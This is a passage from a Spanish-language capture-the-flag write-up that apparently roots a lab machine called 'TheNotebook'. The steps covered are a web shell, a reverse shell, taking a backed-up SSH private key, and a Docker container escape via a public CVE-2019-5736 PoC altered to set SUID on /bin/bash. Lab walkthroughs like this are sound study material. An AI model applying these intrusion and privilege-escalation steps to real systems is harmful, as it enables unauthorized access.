Visitamos esa URL y mediante el parámetro cmd le especificamos comandos a ejecutar:
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781309-e0038a75-a5cf-4c63-8582-50f2aa77f389.png&quot; alt=&quot;whoami&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y… somos el usuario www-data, y ahora que tenemos ejecución de comandos vamos a entablarnos una Reverse Shell.
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781347-ae4d05e2-046a-4786-a528-a0de8fa8d086.png&quot; alt=&quot;._.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;._. Nos han borrado el archivo, así que toca subirlo de nuevo. Estuve un rato probando y no funcionaban los comandos para enviar shells, así que opté por una reverse shell normal, la de PentestMonkey&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781758-eb00cd59-ae32-4934-8070-88a7f952b00c.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahí está, soy www-data, así que procedo a hacer un tratamiento de la TTY para no hacer ctrl + c y quedarme sin shell(me ha pasado).
Recordando la nota de las backups, voy a investigar por ahí, a ver si encuentro algo. Se suelen guardar en /var/backups, y esta máquina no es menos, las backups están ahí. Me las he movido a /dev/shm para trabajar con ellas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781901-814953b0-c657-4f65-b3fb-43194e9c5e88.png&quot; alt=&quot;backups&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ojooooo, tenemos acceso a /home/noah en forma de backup, si listamos los contenidos con ls -la hay un directorio .ssh, y todos sabemos qué significa eso, una id_rsa para entrar como noah.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781965-96f43667-6549-4395-887b-2352ffce10d5.png&quot; alt=&quot;id_rsa&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Me la copio a mi máquina y me autentico como él por SSH para leer la user flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127782047-86046035-d677-449b-acd1-6ea5b9c32bf2.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ez.
Tras entrar a cualquier máquina linux hago sudo -l a ver si pudiera ejecutar como root algún comando, en este caso ¿docker?&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.4$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vamos a buscar la versión a ver si hubiera algún exploit para esa versión:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-bash-4.4$ docker --version
Docker version 18.06.0-ce, build 0ffa825
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Yyyyy justo hay dos de Container Breakout, escapar del contenedor, qué casualidad, no? Ni hecho a posta xD.
https://github.com/Frichetten/CVE-2019-5736-PoC Yo usé este, que es el primero que me encontré :p&lt;/p&gt;

&lt;p&gt;Cambiamos el comando a ejecutar en main.go para darle permiso SUID a la /bin/bash y así entrar como noah por SSH para ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; y conseguir ser root y construimos la aplicación para que pueda correr en la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go build &quot;ldflags -s -w&quot; .&lt;/code&gt; para reducir el peso del archivo y abrimos un servidor HTTP con python para que descargue el ejecutable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127782389-0e0587a1-0ab7-4bc0-952e-6a9ab07580bc.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya está en la máquina, ahora solo falta correr el ejecutable y seremos el todopoderoso root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127782819-7a208abf-3e82-4cd2-b8f3-272c4999e6c6.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y finalmente, máquina rooteada. Me ha gustado bastante la escalada de privilegios, pero no tanto el user, me ha parecido algo simple, pero la máquina en general bien.&lt;/p&gt;

&lt;p&gt;Y recuerda, aguante Metasploit&lt;/p&gt;

</content>
 </entry>
 

</feed>
